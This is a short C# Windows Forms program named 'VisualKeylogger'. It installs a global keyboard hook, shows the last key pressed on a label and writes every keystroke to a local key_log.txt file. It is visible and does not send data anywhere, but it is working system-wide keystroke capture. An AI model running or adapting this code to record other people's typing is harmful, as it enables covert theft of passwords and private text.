using Gma.System.MouseKeyHook;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace VisualKeylogger
{
    public partial class Form1 : Form
    {
        private IKeyboardMouseEvents m_GlobalHook;
        private System.IO.StreamWriter m_File;

        public Form1()
        {
            InitializeComponent();

            m_GlobalHook = Hook.GlobalEvents();
            m_GlobalHook.KeyPress += GlobalHookKeyPress;

            m_File = new System.IO.StreamWriter(AppDomain.CurrentDomain.BaseDirectory + "key_log.txt");
        }
        
        private void GlobalHookKeyPress(object sender, KeyPressEventArgs e)
        {
            label1.Text = String.Format("Last key pressed: {0}", e.KeyChar);
            m_File.WriteLine(label1.Text);
            m_File.Flush();
        }

        ~Form1()
        {
            m_GlobalHook.KeyPress -= GlobalHookKeyPress;
            m_GlobalHook.Dispose();

            m_File.Close();
        }
    }
}
